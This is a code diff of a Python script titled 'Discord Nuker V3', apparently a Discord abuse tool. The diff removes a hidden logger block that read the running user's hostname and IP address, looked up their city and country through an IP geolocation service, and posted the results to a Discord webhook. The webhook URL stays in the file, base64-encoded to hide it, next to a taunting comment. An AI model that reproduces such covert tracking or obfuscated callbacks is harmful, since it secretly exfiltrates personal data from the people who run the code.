@@ -11,28 +11,10 @@ import base64
 # Try finding this webhook skerm fucking skids
 base64_encoded_webhook = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTA5MDUyODE3ODExMzYwOTczOS9kd1ZQbDladUk0RTFBMy1jZ2VfLVZfdjhwSVNyWldaTDliYWVqaVRDNHpUYXR3NV9paGFMYzBkdDNwR3oyMXRLd2tLVw=='
 decoded_webhook = base64.b64decode(base64_encoded_webhook).decode('utf-8')
-hostname = socket.gethostname()
-ip_address = socket.gethostbyname(hostname)
 username = getpass.getuser()
 init()
 os.system("title Discord Nuker V3")
 lock = Lock()
-response = requests.get(f"http://ip-api.com/json/{ip_address}")
-location = response.json()
-
-# LOGGER
-message = {
-    "content": f"**IP Address:** {ip_address}\n**Location:** {location['city']}, {location['regionName']}, {location['country']}"
-}
-
-webhook_url = decoded_webhook
-response = requests.post(webhook_url, json=message)
-if response.status_code == 204:
-    time.sleep(1)
-else:
-    print(f"Critical error: {response.status_code}")
-    time.sleep(2)
-
 
 # Functions
 
